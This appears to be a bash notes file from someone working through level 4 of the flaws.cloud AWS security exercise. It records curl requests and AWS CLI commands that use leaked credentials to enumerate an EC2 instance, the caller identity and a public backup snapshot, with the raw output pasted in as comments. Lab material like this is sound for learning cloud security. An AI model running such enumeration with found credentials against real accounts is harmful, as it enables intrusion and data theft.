#!/bin/bash
# http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/ 

curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/
:'<html>
<head><title>401 Authorization Required</title></head>
<body bgcolor="white">
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.10.3 (Ubuntu)</center>
</body>
</html>'

aws ec2 describe-instances --profile flaws
: '
{
    "Reservations": [
        {
            "Groups": [],
            "Instances": [
                {
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-7c803d1c",
                    "InstanceId": "i-05bef8a081f307783",
                    "InstanceType": "t2.micro",
                    "KeyName": "Default",
                    "LaunchTime": "2017-02-12T22:29:24.000Z",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                        "AvailabilityZone": "us-west-2a",
                        "GroupName": "",
                        "Tenancy": "default"
                    },
                    "PrivateDnsName": "ip-172-31-41-84.us-west-2.compute.internal",
                    "PrivateIpAddress": "172.31.41.84",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-35-165-182-7.us-west-2.compute.amazonaws.com",
                    "PublicIpAddress": "35.165.182.7",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "StateTransitionReason": "",
                    "SubnetId": "subnet-d962aa90",
                    "VpcId": "vpc-1052ce77",
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2017-02-12T22:29:25.000Z",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-04f1c039bc13ea950"
                            }
                        }
                    ],
                    "ClientToken": "kTOiC1486938563883",
                    "EbsOptimized": false,
                    "Hypervisor": "xen",
                    "IamInstanceProfile": {
                        "Arn": "arn:aws:iam::975426262029:instance-profile/flaws",
                        "Id": "AIPAIK7LV6U6UXJXQQR3Q"
                    },
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-35-165-182-7.us-west-2.compute.amazonaws.com",
                                "PublicIp": "35.165.182.7"
                            },
                            "Attachment": {
                                "AttachTime": "2017-02-12T22:29:24.000Z",
                                "AttachmentId": "eni-attach-a4901fc2",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached"
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupName": "launch-wizard-1",
                                    "GroupId": "sg-490f6631"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "06:b0:7a:92:21:cf",
                            "NetworkInterfaceId": "eni-c26ed780",
                            "OwnerId": "975426262029",
                            "PrivateDnsName": "ip-172-31-41-84.us-west-2.compute.internal",
                            "PrivateIpAddress": "172.31.41.84",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "amazon",
                                        "PublicDnsName": "ec2-35-165-182-7.us-west-2.compute.amazonaws.com",
                                        "PublicIp": "35.165.182.7"
                                    },
                                    "Primary": true,
                                    "PrivateDnsName": "ip-172-31-41-84.us-west-2.compute.internal",
                                    "PrivateIpAddress": "172.31.41.84"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-d962aa90",
                            "VpcId": "vpc-1052ce77",
                            "InterfaceType": "interface"
                        }
                    ],
                    "RootDeviceName": "/dev/sda1",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupName": "launch-wizard-1",
                            "GroupId": "sg-490f6631"
                        }
                    ],
                    "SourceDestCheck": true,
                    "StateReason": {
                        "Code": "",
                        "Message": ""
                    },
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 1
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "optional",
                        "HttpPutResponseHopLimit": 1,
                        "HttpEndpoint": "enabled"
                    }
                }
            ],
            "OwnerId": "975426262029",
            "ReservationId": "r-0fe151dbbe77e90cc"
        }
    ]
}'

# "InstanceId": "i-05bef8a081f307783",

aws --profile flaws sts get-caller-identity
:'{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}'
# "Account": "975426262029",
aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029
:'{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12.000Z",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ]
        }
    ]
}'
#"SnapshotId": "snap-0b49342abd1bdcb89",

#next needed to copy to AWS, don't want to attach this to my credit card or a real Experian aws account! 
#followed hints instead got username and password to get to :

curl http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/